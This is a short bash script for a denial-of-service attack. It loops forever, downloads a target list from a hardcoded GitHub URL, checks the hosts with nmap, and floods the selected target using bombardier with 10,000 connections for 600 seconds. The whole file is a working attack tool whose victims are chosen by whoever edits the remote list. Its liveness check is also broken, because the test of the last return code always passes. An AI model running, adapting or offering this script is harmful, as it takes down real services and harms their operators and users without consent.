#!/bin/bash

#$1-port $2-proto $3-host
function host_checker(){
  if [[ `nmap -s${2} -p ${1} ${3} | grep '1 host up'` ]]; then
    echo ${3}:${1}/${2} is UP
    return 0
  else
    echo ${3}:${1}/${2} is DOWN
    return 1
  fi
}

while :
do
  DURATION=''
  TARGETS_URL=''
  TARGET=''
  CONNECTIONS=''

  if [ -z "${TARGETS_URL}" ]; then
      TARGETS_URL='https://raw.githubusercontent.com/WhiteHeal/target/main/target'
      echo "TARGETS_URL is not specified, using default: ${TARGETS_URL}" >&2
  fi

  if [ -z "${TARGET}" ]; then
      echo "TARGET is not specified, chosing from: ${TARGETS_URL}" >&2
  fi

  if [ -z "${CONNECTIONS}" ]; then
      CONNECTIONS=10000
      echo "CONNECTIONS is not specified, using default: ${CONNECTIONS}" >&2
  fi

  if [ -z "${DURATION}" ]; then
      DURATION=600
      echo "DURATION is not specified, using default: ${DURATION}s" >&2
  fi

  #TARGET FORMAT IS <hostname>:<port>/<proto>
  targets_str=$(curl -s -H 'Cache-Control: no-cache' ${TARGETS_URL})
  targets=(${targets_str// /"\n"})
  for i in "${targets[@]}"; do
    FIELDS=($(echo "${i}" | awk '{split($0, arr, /[\/:]/); for (x in arr) { print arr[x] }}'))

    host=${FIELDS[0]}
    port=${FIELDS[1]}
    proto=${FIELDS[2]}

    if [ "${proto}" == "UDP" ]; then
      proto_short=U
    else
      proto_short=T
    fi

    host_checker ${port} ${proto_short} ${host}

    if [ $? ]; then
      TARGET=$i
    fi
  done

  bombardier -c ${CONNECTIONS} -d ${DURATION}s -l ${TARGET}
  sleep 5
done